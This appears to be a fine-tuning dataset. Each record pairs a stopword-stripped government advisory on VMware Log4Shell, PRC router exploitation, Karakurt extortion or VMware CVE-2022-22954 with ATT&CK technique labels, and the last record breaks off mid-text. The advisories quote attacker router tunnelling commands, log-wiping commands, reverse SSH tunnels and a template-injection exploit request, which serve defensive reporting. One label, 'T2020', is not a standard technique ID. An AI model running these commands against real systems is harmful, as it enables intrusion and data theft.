{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today install fixed builds updating affected vmware horizon uag systems latest versions updates workarounds promptly applied following vmwares release updates log4shell december 2021 treat affected vmware systems compromised minimize internetfacing attack surface hosting essential services segregated demilitarized dmz zone ensuring strict network perimeter access controls implementing regularly updated web application firewalls wafs front publicfacing services cybersecurity infrastructure security agency cisa united states coast guard cyber command cgcyber releasing joint cybersecurity advisory csa warn network defenders cyber threat actors including statesponsored advanced persistent threat apt actors continued exploit cve202144228 log4shell vmware horizon unified access gateway uag servers obtain initial access organizations apply available patches workarounds since december 2021 multiple threat actor groups exploited log4shell unpatched publicfacing vmware horizon uag servers part exploitation suspected apt actors implanted loader malware compromised systems embedded executables enabling remote command control c2 one confirmed compromise apt actors able move laterally inside network gain access disaster recovery network collect exfiltrate sensitive data csa provides suspected apt actors tactics techniques procedures ttps information loader malware indicators compromise iocs information derived two related incident response engagements malware analysis samples discovered victims networks cisa cgcyber recommend organizations affected systems immediately apply available patches workarounds assume compromise initiate threat hunting activities using iocs provided csa malware analysis report mar103825801 mar103822541 potential compromise detected administrators apply incident response recommendations included csa report key findings cisa update july 18 2022 cybersecurity advisory csa updated additional malware analysis reportmar103825802 provides additional indicators compromise iocs update end see list download copies iocs aa22174a stix mar103822541 stix mar103825801 stix update july 18 2022 mar103825802 stix download pdf version reportpdf 426kb technical details note advisory uses mitre attck enterprise framework version 11 see appendix table threat actors activity mapped mitre attck tactics techniques log4shell remote code execution vulnerability affecting apache log4j library variety products using log4j consumer enterprise services websites applications products including certain versions vmware horizon uag vulnerability enables malicious cyber actors submit specially crafted request vulnerable system causing system execute arbitrary code request allows malicious actors take full control affected system information log4shell see cisas apache log4j vulnerability guidance webpage vmware advisory vmsa2021002813 vmware made fixes available december 2021 confirmed exploitation wild december 10 20211 since december 2021 multiple cyber threat actor groups exploited log4shell unpatched publicfacing vmware horizon uag servers obtain initial access networks obtaining access actors implanted loader malware compromised systems embedded executables enabling remote c2 actors connected known malicious ip address 104223341982 ip address uses selfsigned certificate cn winp9nrmh5g6m8in least one confirmed compromise actors collected exfiltrated sensitive information victims network sections provide information cisa cgcyber obtained incident response activities two related confirmed compromises victim 1 cgcyber conducted proactive threathunting engagement organization victim 1 compromised actors exploiting log4shell vmware horizon obtaining access threat actors uploaded malware hmsvcexe compromised system malware installation connections ip address 10422334198 observed cisa cgcyber analyzed sample hmsvcexe confirmed compromise hmsvcexe masquerades legitimate microsoft windows service sysinternals logonsessions software appears modified version sysinternals logonsessions software embedded malicious packed code discovered analyzed sample hmsvcexe running nt authoritysystem highest privilege level windows system unknown actors elevated privileges hmsvcexe windows loader containing embedded executable 658dump64exe embedded executable remote access tool provides array c2 capabilities including ability log keystrokes upload execute additional payloads provide graphical user interface gui access target windows systems desktop malware function c2 tunneling proxy allowing remote operator pivot systems move network first executed hmsvcexe creates scheduled task cwindowssystem32taskslocal session updater executes malware every hour executed two randomly named tmp files written disk location cusersuserappdatalocaltemp embedded executable attempts connect hardcoded c2 server 19295208 port 4443 nonstandard porttt571 executables inbound outbound communications encrypted 128bit key information hmsvcexe including iocs detection signatures see mar103822541 victim 2 late april may 2022 cisa conducted onsite incident response engagement organization victim 2 cisa observed bidirectional traffic organization suspected apt ip address 10422334198 incident response cisa determined victim 2 compromised multiple threat actor groups threat actors using ip 10422334198 gained initial access victim 2s production environment late january 2022 earlier actors likely obtained access exploiting log4shell unpatched vmware horizon server around january 30 likely shortly threat actors gained access cisa observed actors using powershell scripts callout 10924815013 via hypertext transfer protocol http retrieve additional powershell scripts around period cisa observed actors attempt download execute malicious file 10924815013 activity started ip address 104155149103 appears part actors c2 infrastructure gaining initial access vmware horizon server threat actors moved laterally via remote desktop protocol rdp multiple hosts production environment including security management server certificate server database containing sensitive law enforcement data mail relay server threat actors also moved laterally via rdp organizations disaster recovery network threat actors gained credentials multiple accounts including administrator accounts unknown credentials acquired moving laterally production environment hosts servers actors implanted loader malware compromised servers containing executables enabling remote c2 threat actors used compromised administrator accounts run loader malware loader malware appears modified versions sysinternals logonsessions du psping software embedded executables belong malware family similar design functionality 658dump64exe provide c2 capabilities remote operator c2 capabilities include ability remotely monitor systems desktop gain reverse shell access exfiltrate data upload execute additional payloads embedded executables also function proxy cisa found following loader malware svcedgeexe malicious windows loader containing encrypted executable f7dump64exe executed svcedgeexe decrypts loads f7dump64exe memory runtime f7dump64exe connects hardcoded c2 server 134119177107 port 443 odbccadsexe malicious windows loader containing encrypted executable executed odbccadsexe decrypts loads executable memory executable attempts communication remote c2 address 134119177107 praiserexe windows loader containing encrypted executable executed praiserexe decrypts loads executable memory executable attempts connection hardcoded c2 address 162245190203 fontdrvhostsexe windows loader contains encrypted executable executed fontdrvhostsexe decrypts loads executable memory executable attempts connection hardcoded c2 address 15594211207 windsexe windows loader containing encrypted malicious executable found server running service runtime encrypted executable decrypted loaded memory executable attempts communication hardcoded c2 address 185136163104 windsexe complex obfuscation hindering analysis code structures executables inbound outbound communications encrypted xor key information malware samples including iocs detection signatures see mar103825801 additionally cisa identified java server pages jsp application error401js functioning malicious webshellt505003 malicious dynamic link library dll file error401jsp webshell designed parse data commands incoming http requests providing remote operator c2 capabilities compromised linux windows systems error401jsp allows actors retrieve files target system upload files target system execute commands target system rtelnet used execute commands target system commands data sent encrypted via rc4 information error401jsp including iocs seemar10382580 2 newdevdll ran service profile known compromised user mail relay server malware path cusersuserappdataroamingnewdevdll dll may newdevdll attributed apt actors opensource reporting however cisa unable recover file analysis threat actors collected likely exfiltrated data victim 2s production environment three week period security management certificate servers communicated foreign ip address 9222224176 period security management server sent 130 gigabytes gb data foreign ip address 9222224176 indicating actors likely exfiltrated data production environment cisa also found rar files containing sensitive law enforcement investigation data known compromised administrator account note second threat actor group access organizations test production environments around april 13 2022 leveraged cve202222954 implant dingo jspy webshell according trusted thirdparty reporting multiple large organizations targeted cyber actors leveraging cve202222954 cve202222960 information exploitation cve202222954 cve202222960 see cisa csa threat actors chaining unpatched vmware vulnerabilities full system control incident response administrators discover system compromise cisa cgcyber recommend immediately isolating affected systems collecting reviewing relevant logs data artifacts considering soliciting support thirdparty incident response organization provide subject matter expertise ensure actor eradicated network avoid residual issues could enable followon exploitation reporting incidents cisa via cisas 247 operations center reportcisagov 8882820870 report cyber incidents coast guard pursuant 33 cfr section101305 contact us coast guard uscg national response center nrc nrcuscgmil 8004248802 mitigations cisa cgcyber recommend organizations install updated builds ensure affected vmware horizon uag systems updated latest version updates workarounds promptly applied following vmwares release updates log4shell december 2021 treat thosevmware horizon systems compromised follow proactive incident response procedures outlined prior applying updates compromise detected apply updates soon possible see vmware security advisory vmsa2021002813 vmware knowledge base kb 87073 determine vmware horizon components vulnerable note update fully implemented consider removing vulnerable components internet limit scope traffic installing updates ensure network perimeter access controls restrictive possible upgrading immediately feasible see kb87073 kb87092 vendorprovided temporary workarounds implement temporary solutions using account administrative privileges note temporary solutions treated permanent fixes vulnerable components upgraded latest build soon possible prior implementing temporary solution ensure appropriate backups completed verify successful implementation mitigations executing vendor supplied script horizonwindowslog4jmitigationszip without parameters ensure vulnerabilities remain see kb87073 details additionally cisa cgcyber recommend organizations keep software date prioritize patching known exploited vulnerabilities kevs minimize internetfacing attack surface hosting essential services segregated dmz ensuring strict network perimeter access controls hosting internetfacing services nonessential business operations possible implement regularly updated wafs front publicfacing services wafs protect web based exploitation using signatures heuristics likely block alert malicious traffic use best practices identity access management iam implementing multifactor authentication mfa enforcing use strong passwords limiting user access principle least privilege contact information recipients report encouraged contribute additional information related threat request incident response resources technical assistance related threats email cisa reportcisagov contact coast guard cyber command relation threats email maritimecyberuscgmil report cyber incidents coast guard pursuant 33 cfr section101305 contact uscg nrc nrcuscgmil 8004248802 resources information log4shell see cisas apache log4j vulnerability guidance webpage joint csa mitigating log4shell log4jrelated vulnerabilities cisas database known vulnerable services cisa github page see national security agency nsa australian signals directorate asd guidance block defend web shell malware additional guidance hardening internetfacing systems references1 vmware security advisory vmsa20210028132 fortinets blog new milestones deep panda log4shell digitally signed fire chili rootkits appendix indicators compromise see mar103825801and mar103822541and table 1 iocs see list download copies iocs mar103825801stix mar103822541 stix table 1 indicators compromise appendix b threat actor ttps see table 2 threat actors tactics techniques identified csa see mitre attck enterprise framework version 11 referenced threat actor tactics techniques table 2 tactics techniques disclaimer 2021 mitre corporation work reproduced distributed permission mitre corporation acknowledgements cisa cgcyber would like thank vmware secureworks contributions csa revisions june 23 2022 initial versionjune 24 2022 added link aa22174astixxmljuly 18 2022 mar103825802 stix product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1190"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary best practices apply patches soon possible disable unnecessary ports protocols replace endoflife infrastructure implement centralized patch management system joint cybersecurity advisory describes ways peoples republic china prc statesponsored cyber actors continue exploit publicly known vulnerabilities order establish broad network compromised infrastructure actors use network exploit wide variety targets worldwide including public private sector organizations advisory details targeting compromise major telecommunications companies network service providers top vulnerabilitiesprimarily common vulnerabilities exposures cvesassociated network devices routinely exploited cyber actors since 2020 joint cybersecurity advisory coauthored national security agency nsa cybersecurity infrastructure security agency cisa federal bureau investigation fbi builds previous nsa cisa fbi reporting inform federal state local tribal territorial sltt government critical infrastructure ci including defense industrial base dib private sector organizations notable trends persistent tactics techniques procedures ttps entities mitigate vulnerabilities listed advisory applying available patches systems replacing endoflife infrastructure implementing centralized patch management program nsa cisa fbi urge us allied governments ci private industry organizations apply recommendations listed mitigations section appendix vulnerabilities increase defensive posture reduce risk prc statesponsored malicious cyber actors affecting critical networks information prc statesponsored malicious cyber activity see cisas china cyber threat overview advisories webpage click herefor pdf common vulnerabilities exploited peoples republic china statesponsored cyber actors prc statesponsored cyber actors readily exploit vulnerabilities compromise unpatched network devices network devices small officehome office soho routers network attached storage nas devices serve additional access points route command control c2 traffic act midpoints conduct network intrusions entities last years series highseverity vulnerabilities network devices provided cyber actors ability regularly exploit gain access vulnerable infrastructure devices addition devices often overlooked cyber defenders struggle maintain keep pace routine software patching internetfacing services endpoint devices since 2020 prc statesponsored cyber actors conducted widespread campaigns rapidly exploit publicly identified security vulnerabilities also known common vulnerabilities exposures cves technique allowed actors gain access victim accounts using publicly available exploit code virtual private network vpn services public facing applicationswithout using distinctive identifying malwareso long actors acted victim organizations updated systems prc statesponsored cyber actors typically conduct intrusions accessing compromised servers called hop points numerous chinabased internet protocol ip addresses resolving different chinese internet service providers isps cyber actors typically obtain use servers leasing remote access directly indirectly hosting providers use servers register access operational email accounts host c2 domains interact victim networks cyber actors use hop points obfuscation technique interacting victim networks cyber actors also consistently evolving adapting tactics bypass defenses nsa cisa fbi observed statesponsored cyber actors monitoring network defenders accounts actions modifying ongoing campaign needed remain undetected cyber actors modified infrastructure toolsets immediately following release information related ongoing campaigns prc statesponsored cyber actors often mix customized toolset publicly available tools especially leveraging tools native network environment obscure activity blending noise normal activity network nsa cisa fbi consider common vulnerabilities exposures cves listed table 1 network device cves frequently exploited prc statesponsored cyber actors since 2020 table 1 top network device cves exploited prc statesponsored cyber actors telecommunications network service provider targeting prc statesponsored cyber actors frequently utilize opensource tools reconnaissance vulnerability scanning actors utilized opensource router specific software frameworks routersploit routerscan identify makes models known vulnerabilities investigation exploitation routersploit framework opensource exploitation framework dedicated embedded devices routerscan opensource tool easily allows scanning ip addresses vulnerabilities tools enable exploitation soho routers manufactured major industry providers including cisco fortinet mikrotik upon gaining initial foothold telecommunications organization network service provider prc statesponsored cyber actors identified critical users infrastructure including systems critical maintaining security authentication authorization accounting identifying critical remote authentication dialin user service radius server cyber actors gained credentials access underlying structured query language sql database utilized sql commands dump credentials contained cleartext hashed passwords user administrative accounts gained credentials radius server prc statesponsored cyber actors used credentials custom automated scripts authenticate router via secure shell ssh execute router commands save output scripts targeted cisco juniper routers saved output executed commands including current configuration router successfully capturing command output configurations exfiltrated network actors infrastructure cyber actors likely used additional scripting automate exploitation medium large victim networks routers switches numerous gather massive numbers router configurations would necessary successfully manipulate traffic within network armed valid accounts credentials compromised radius server router configurations cyber actors returned network used access knowledge successfully authenticate execute router commands surreptitiously route capture exfiltrate traffic network actorcontrolled infrastructure manufacturers likely similar commands cyber actors executed following commands juniper router perform initial tunnel configuration eventual exfiltration network set chassis fpc slot number pic user defined value tunnelservices bandwidth user defined value set chassis networkservices allethernet set interfaces interfaceid unit unit number tunnel source local network ip address set interfaces interfaceid unit unit number tunnel destination actor controlled ip address establishing tunnel cyber actors configured local interface device updated routing table route traffic actorcontrolled infrastructure set interfaces interfaceid unit unit number family inet address local network ip address subnet set routingoptions static route local network ip address nexthop actor controlled ip address prc statesponsored cyber actors configured port mirroring copy traffic local interface subsequently forwarded tunnel network actorcontrolled infrastructure set firewall family inet filter filter name term filter variable portmirror set forwardingoptions portmirroring input rate 1 set forwardingoptions portmirroring family inet output interface interfaceid nexthop local network ip address set forwardingoptions portmirroring family inet output nofiltercheck set interfaces interfaceid unit unit number family inet filter input filter name set interfaces interfaceid unit unit number family inet filter output filter name completed configuration changes cyber actors often modified andor removed local log files destroy evidence activity obfuscate presence evade detection sed e regexd log filepath 1 sed e regexd log filepath 2 sed e regexd log filepath 3 rm f log filepath 4 rm f log filepath 5 rm f log filepath 6 prc statesponsored cyber actors also utilized command line utility programs like putty link plink establish ssh tunnels internal hosts leased virtual private server vps infrastructure actors often conducted system network configuration discovery host networks sending hypertext transfer protocol http requests c2 infrastructure order illuminate external public ip address plinkexe n r local porthost 1remote port pw user defined password batch rootvps1 p remote ssh port plinkexe n r local porthost 2remote port pw user defined password batch rootvps2 p remote ssh port mitigations nsa cisa fbi urge organizations apply following recommendations well mitigation detection recommendations appendix tailored observed tactics techniques vulnerabilities specific additional mitigations following mitigations generally apply keep systems products updated patched soon possible patches releasedd3su consider leveraging centralized patch management system automate expedite process immediately remove isolate suspected compromised devices networkd3itfd3otf segment networks limit block lateral movementd3ni disable unused unnecessary network services ports protocols devicesd3achd3itfd3otf enforce multifactor authentication mfa users without exceptiond3mfa enforce mfa vpn connectionsd3mfa mfa unavailable enforce password complexity requirementsd3spp implement strict password requirements enforcing password complexity changing passwords defined frequency performing regular account reviews ensure complianced3spp perform regular data backup procedures maintain uptodate incident response recovery procedures disable external management capabilities set outofband management networkd3ni isolate internetfacing services network demilitarized zone dmz reduce exposure internal networkd3ni enable robust logging internetfacing services monitor logs signs compromised3ntad3pm ensure dedicated management systemsd3ph accounts system administrators protect accounts strict network policiesd3uap enable robust logging review network infrastructure accesses configuration changes critical infrastructure services performing authentication authorization accounting functionsd3pm upon responding confirmed incident within portion network response teams scrutinize network infrastructure accesses evaluate potential lateral movement network infrastructure implement corrective actions commensurate findings resources refer uscertcisagovchina httpswwwic3govhomeindustryalerts httpswwwnsagovcybersecurityguidance previous reporting peoples republic china statesponsored malicious cyber activity us government critical infrastructure organizations consider signing cisas cyber hygiene services including vulnerability scanning help reduce exposure threats us defense industrial base dib organizations consider signing nsa cybersecurity collaboration centers dib cybersecurity service offerings including protective domain name system pdns services vulnerability scanning threat intelligence collaboration information eligibility criteria enroll services email dibdefensecybernsagov additional references cisa 2022 weak security controls practices routinely exploited initial access httpswwwcisagovuscertncasalertsaa22137a cisa 2022 2021 top routinely exploited vulnerabilities httpswwwcisagovuscertncasalertsaa22117a nsa 2021 selecting hardening remote access vpn solutions httpsmediadefensegov2021sep282002863184110csiselectinghardeningremoteaccessvpns20210928pdf nsa 2021 chinese statesponsored cyber operations observed ttps httpsmediadefensegov2021jul192002805003110csachinesestatesponsoredcyberttpspdf cisa 2021 exploitation pulse connect secure vulnerabilities httpswwwcisagovuscertncasalertsaa21110a nsa 2020 chinese statesponsored actors exploit publicly known vulnerabilities httpsmediadefensegov2020oct202002519884110csachineseexploitvulnerabilitiesuoo179811pdf cisa 2020 chinese ministry state securityaffiliated cyber threat actor activity httpswwwcisagovuscertncasalertsaa20258a nsa 2020 performing outofband network management httpsmediadefensegov2020sep172002499616110performingoutofbandnetworkmanagement20200911pdf cisa 2020 critical vulnerability citrix application delivery controller gateway sdwan wanop httpswwwcisagovuscertncasalertsaa20020a nsa 2019 mitigating recent vpn vulnerabilities httpsmediadefensegov2019oct072002191601110mitigating20recent20vpn20vulnerabilities2020copypdf nsa 2019 update upgrade software immediately httpsmediadefensegov2019sep092002180319110update20and20upgrade20software20immediatelydocx2020copypdf contact information report incidents anomalous activity request incident response resources technical assistance related threats contact cisa reportcisagov report computer intrusion cybercrime activity related information found advisory contact local fbi field office wwwfbigovcontactusfield fbis 247 cyber watch 8552923937 email cywatchfbigov nsa client requirements general cybersecurity inquiries contact cybersecurityrequestsnsagov media inquiries press desk nsa media relations 4436340721 mediarelationsnsagov cisa media relations 7032352010 cisamediacisadhsgov fbi national press office 2023243691 npofbigov disclaimer endorsement information opinions contained document provided without warranties guarantees reference herein specific commercial products process service trade name trademark manufacturer otherwise constitute imply endorsement recommendation favoring united states government guidance shall used advertising product endorsement purposes purpose advisory developed nsa cisa fbi furtherance respective cybersecurity missions including responsibilities develop issue cybersecurity specifications mitigations information may shared broadly reach appropriate stakeholders appendix vulnerabilities table 2 information cisco cve20180171 table 3 information cisco cve201915271 table 4 information cisco cve20191652 table 5 information citrix cve201919781 table 6 information draytek cve20208515 table 7 information dlink cve201916920 table 8 information fortinet cve201813382 table 9 information mikrotik cve201814847 table 10 information netgear cve20176862 table 11 information pulse cve201911510 table 12 information pulse cve202122893 table 13 information qnap cve20197192 table 14 information qnap cve 20197193 table 15 information qnap cve20197194 table 16 information qnap cve20197195 table 17 information zyxel cve202029583 revisions initial version june 7 2022 product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1016.001, T1078, T1119, T1133, T1190, T1555, T1572, T1595.002, T2020"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate cyber threats karakurt ransomware prioritize patching known exploited vulnerabilities train users recognize report phishing attempts enforce multifactor authentication summary federal bureau investigation fbi cybersecurity infrastructure security agency cisa department treasury treasury financial crimes enforcement network fincen releasing joint cybersecurity advisory csa provide information karakurt data extortion group also known karakurt team karakurt lair karakurt actors employed variety tactics techniques procedures ttps creating significant challenges defense mitigation karakurt victims reported encryption compromised machines files rather karakurt actors claimed steal data threatened auction release public unless receive payment demanded ransom known ransom demands ranged 25000 13000000 bitcoin payment deadlines typically set expire within week first contact victim karakurt actors typically provided screenshots copies stolen file directories proof stolen data karakurt actors contacted victims employees business partners clients harassing emails phone calls pressure victims cooperate emails contained examples stolen data social security numbers payment accounts private company emails sensitive business data belonging employees clients upon payment ransoms karakurt actors provided form proof deletion files occasionally brief statement explaining initial intrusion occurred prior january 5 2022 karakurt operated leaks auction website found httpskarakurtgroup domain ip address originally hosting website went offline spring 2022 website longer accessible open internet reported located elsewhere deep web dark web may 2022 website contained several terabytes data purported belong victims across north america europe along several press releases naming victims paid cooperated instructions participating victim data auctions download pdf version report aa22152a karakurt data extortion group pdf 50881 kb click stix technical details initial intrusion karakurt appear target specific sectors industries types victims reconnaissance karakurt actors appear obtain access victim devices primarily purchasing stolen login credentials via cooperating partners cybercrime community provide karakurt access already compromised victims buying access already compromised victims via thirdparty intrusion broker networks note intrusion brokers intrusion broker networks malicious individual cyber actors groups actors use variety tools skills obtain initial access toand often create marketable persistence withinprotected computer systems intrusion brokers sell access compromised computer systems cybercriminal actors engaged ransomware business email compromise corporate government espionage etc karakurt victims reported initial intrusion may occurred via compromised cisco anyconnect vpn user accounts many victims reported multifactor authentication enforced cisco anyconnect vpn platforms common intrusion vulnerabilities exploited initial accessta001 karakurt events include following outdated sonicwall ssl vpn appliances vulnerable multiple recent cves log4j log4shell apache logging services vulnerability cve202144228 phishing spearphishing malicious macros within email attachments stolen virtual private network vpn remote desktop protocol rdp credentials outdated fortinet fortigate ssl vpn appliancesfirewall appliances vulnerable multiple recent cves outdated andor unserviceable microsoft windows server instances outdated andor unpatched cisco anyconnect software hardware appliances network reconnaissance enumeration persistence exfiltration upon developing obtaining access compromised system karakurt actors deploy cobalt strike beacons enumerate network install mimikatz pull plaintext credentials use anydesk obtain persistent remote control utilize additional situationdependent tools elevate privileges move laterally within network karakurt actors compress typically 7zip exfiltrate large sums dataand many cases entire networkconnected shared drives volumes exceeding 1 terabyte tbusing open source applications file transfer protocol ftp services filezilla cloud storage services including rclone meganz extortion following exfiltration data karakurt actors present victim ransom notes way readmetxt files via emails sent victim employees compromised email networks emails sent victim employees external email accounts ransom notes reveal victim hacked karakurt team threaten public release auction stolen data instructions include link tor url access code visiting url inputting access code open chat application victims negotiate karakurt actors data deleted karakurt victims reported extensive harassment campaigns karakurt actors employees business partners clients receive numerous emails phone calls warning recipients encourage victims negotiate actors prevent dissemination victim data communications often included samples stolen dataprimarily personally identifiable information pii employment records health records financial business records victims negotiate karakurt actors receive proof life screenshots showing file trees allegedly stolen data cases actual copies stolen files upon reaching agreement price stolen data victims karakurt actors provided bitcoin addressusually new previously unused addressto ransom payments could made upon receiving ransom karakurt actors provide form alleged proof deletion stolen files screen recording files deleted deletion log credentials victim log storage server delete files although karakurts primary extortion leverage promise delete stolen data keep incident confidential victims reported karakurt actors maintain confidentiality victim information ransom paid note us government strongly discourage payment ransom karakurt threat actors cyber criminals promising delete stolen files exchange payments cases karakurt actors conducted extortion victims previously attacked ransomware variants cases karakurt actors likely purchased otherwise obtained previously stolen data karakurt actors also targeted victims time victims attack ransomware actors cases victims received ransom notes multiple ransomware variants simultaneously suggesting karakurt actors purchased access compromised system also sold another ransomware actor karakurt actors also exaggerated degree victim compromised value data stolen example instances karakurt actors claimed steal volumes data far beyond storage capacity compromised systems claimed steal data belong victim indicators compromise mitre attck tactics techniques see table 1 referenced threat actor tactics techniques advisory well corresponding detection andor mitigation recommendations additional mitigations see mitigations section mitigations implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud implement network segmentation maintain offline backups data ensure limited interruption organization regularly back data password protect backup copies offline ensure copies critical data accessible modification deletion system data resides install regularly update antivirus software hosts enable real time detection install updatespatch operating systems software firmware soon updatespatches released review domain controllers servers workstations active directories new unrecognized accounts audit user accounts administrative privileges configure access controls least privilege mind give users administrative privileges disable unused ports consider adding email banner emails received outside organization disable hyperlinks received emails enforce multifactor authentication use national institute standards technologys nists standards developing managing password policies use longer passwords consisting least 8 characters 64 characters length store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwords implement multiple failed login attempt account lockouts disable password hints refrain requiring password changes frequently per year note nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software use secure networks avoid using public wifi networks consider installing using vpn focus cyber security awareness training regularly provide users training information security principles techniques well overall emerging cybersecurity risks vulnerabilities ie ransomware phishing scams resources additional resources related prevention mitigation ransomware visit stopransomwaregov well thecisamultistate information sharing analysis center msisac joint ransomware guide nists data integrity detecting responding ransomware destructive events stopransomwaregov us governments onestop location resources tackle ransomware effectively cisas ransomware readiness assessment nocost selfassessment based tiered set practices help organizations better assess well equipped defend recover ransomware incident cisa offers range nocost cyber hygiene services help critical infrastructure organizations assess identify reduce exposure threats including ransomware financial institutions must also ensure compliance applicable bank secrecy act requirements including suspicious activity reporting obligations indicators compromise suspicious email addresses file names hashes domains ip addresses provided item 44 suspicious activity report sar form information mandatory voluntary reporting cyber events via suspicious activity reports sars see fincen advisory fin2016a005 advisory financial institutions cyberevents cyberenabled crime october 25 2016 fincen advisory fin2021a004 advisory ransomware use financial system facilitate ransom payments november 8 2021 updates fincen advisory fin2020a006 us department states rewards justice rfj program offers reward 10 million reports foreign government malicious activity us critical infrastructure see rfj website information report information securely version history june 01 2022 initial version june 02 2022 added stix file december 12 2023 added language cisco vpns possible initial access vector product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1048, T1078, T1083, T1133, T1190, T1219, T1566, T1566.001, T1567.002, T1589.001, T1589.002"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary update june 2 2022 cybersecurity advisory csa updated additional indicators compromise iocs detection signatures well tactics techniques procedures ttps trusted third parties update end cybersecurity infrastructure security agency cisa releasing csa warn organizations malicious cyber actors likely advanced persistent threat apt actors exploiting cve202222954 cve202222960 separately combination vulnerabilities affect certain versions vmware workspace one access vmware identity manager vidm vmware vrealize automation vra vmware cloud foundation vrealize suite lifecycle manager exploiting vulnerabilities permits malicious actors trigger serverside template injection may result remote code execution rce cve202222954 escalation privileges root cve202222960 vmware released updates vulnerabilities april 6 2022 according trusted third party malicious cyber actors able reverse engineer updates develop exploit within 48 hours quickly began exploiting disclosed vulnerabilities unpatched devices cisa made aware exploit week later added cve202222954 cve202222960 catalog known exploited vulnerabilities april 14 april 15 respectively accordance binding operational directive bod 2201 reducing significant risk known exploited vulnerabilities federal agencies required apply updates cve202222954 cve202222960 may 5 may 6 2022 respectively note based activity cisa expects malicious cyber actors quickly develop capability exploit newly released vulnerabilities cve202222972 cve202222973 impacted vmware products response cisa released emergency directive ed 2203 mitigate vmware vulnerabilities requires emergency action federal civilian executive branch agencies either immediately implement updates vmware security advisory vmsa20220014 remove affected software network updates applied cisa deployed incident response team large organization threat actors exploited cve202222954 additionally cisa received informationincluding iocsabout observed exploitation multiple large organizations trusted third parties csa provides iocs detection signatures cisa well trusted third parties assist administrators detecting responding activity update june 2 2022 csa also provides ttps activity trusted third parties assist administrators detecting responding activity update end due rapid exploitation vulnerabilities cisa strongly encourages organizations internetfacing affected systemsthat immediately apply updatesto assume compromise initiate threat hunting activities using detection methods provided csa potential compromise detected administrators apply incident response recommendations included csa download pdf version report pdf 349kb downloadable copy iocs see aa22138bstix technical details cisa deployed incident response team large organization threat actors exploited cve202222954 additionally cisa received information observed exploitation cve202222954 cve202222960 multiple threat actors multiple large organizations trusted third parties cve202222954 enables actor network access trigger serverside template injection may result rce vulnerability affects following products1 vmware workspace one access versions 210801 210800 201001 201000 vidm versions 336 335 334 333 vmware cloud foundation 4x vrealize suite lifecycle manager 8x cve202222960 enables malicious actor local access escalate privileges root due improper permissions support scripts vulnerability affects following products2 vmware workspace one access versions 210801 210800 201001 201000 vidm versions 336 335 334 333 vra version 76 vmware cloud foundation 3x 4x vrealize suite lifecycle manager 8x according trusted thirdparty reporting threat actors may chain vulnerabilities one compromised organization around april 12 2022 unauthenticated actor network access web interface leveraged cve202222954 execute arbitrary shell command vmware user actor exploited cve202222960 escalate users privileges root root access actor could wipe logs escalate permissions move laterally systems update june 2 2022 information compromised organization see victim 1 section update end threat actors dropped postexploitation tools including dingo jspy webshell publicly available webshell includes command execution file manager database manager port scanner incident response activities cisa observed around april 13 2022 threat actors leveraging cve202222954 drop dingo jspy webshell around period trusted third party observed threat actors leveraging cve202222954 drop dingo jspy webshell one organization according third party actors may also dropped dingo jspy webshell third organization note analysis first compromise associated malware ongoing cisa update information case learn update june 2 2022 following sections include additional information including iocs ttps trusted third parties two confirmed compromises see appendix ttps csa mapped mitre attck enterprise framework victim 1 trusted third party assesses multiple threat actors referred threat actor 1ta1 threat actor 2ta2 gained access publicfacing server running vmware workspace one access ta1 downloaded malicious shell script used collect exfiltrate sensitive data ta2 interacted server without automation scripts installed multiple webshells reverse secure socket socks proxy threat actor 1 april 12 ta1 exploited cve 202222954 download malicious shell script https2023297189up80b6ae2ceash ta1 first targeted freemarkera legitimate application allows customized notifications creating templatesto send following customized get request uri compromised server get catalogportaluioauthverifyerrordeviceudid247b22freemarkertemplateutilityexecute223fnew28292822cat20usrlocalhorizonconfsystemconfigproperties22297dhttp11 get request resulted server downloading malicious shell script 80b6ae2ceash vmware workspace one access directory usrlocalhorizonscripts ta1 chained cve 202222960 initial exploit run shell script root privileges script executed sudo command script contained vmware workspace one access directory paths file locations developed data exfiltration malicious script collected sensitive filesincluding user names passwords master keys firewall rulesand stored tar ball tar ball compressed zipped file used threat actors collection exfiltration tar ball located vmware workspace one access directory optvmwarehorizonworkspacewebappssaashorizonimages malicious script deleted evidence compromise modifying logs original state deleting files ta1 deleted many files logs including fd86ald0pem localhostaccess logs logs associated vmware horizon application greenbox logs date activity april 12 note cisa received similar malicious bash script analysis trusted third party different known compromise see victim 2 section information april 12 ta1 also downloaded jtestjsp jsp webshell servers web directory saashorizonjslib ip address 186233187245 ta1 returned server april 12 collect sensitive data stored tar ball get request threat actor 2 april 13 14 ta2 sent many get requests server exploitingor attempting exploitcve 202222954 obtain rce upload binaries upload webshells persistence april 13 ta2 attempted download webshell appjsp md5 4cd8366345ad4068feca4d417738b4bd ip address 517917153 appjsp publicly available webshell known godzilla april 13 ta2 downloaded jsp webshell md 5 f8ff5c72e8ffa2112b01802113148bd1 http8438133149imgicon1gif april 13 ta2 sent thousands unix commands ip address 8438133149 enabled ta2 view etcpasswd etcshadow password files unix commands included whoami id cat trusted third party found two copies dingo jspy webshell md5 5b0bfda04a1e0d8dcb02556dc4e56e6a web directories horizonalljsp optvmwarehorizonworkspacewebappssaashorizonportal web directory jqueryjsp webappscasstatic directory third party unable determine webshells created ta2 used post requests communicate dingo jspy webshells commands output encrypted xor key april 14 ta2 downloaded reverse socks proxy ta2 first sent get request chmod command change permissions tmp12865xax hidden file tmp directory actor downloaded binary md5 dc88c5fe715b5f706f9fb92547da948a httpsgithubcomkostrevsocksreleasesdownloadv110revsockslinuxamd64 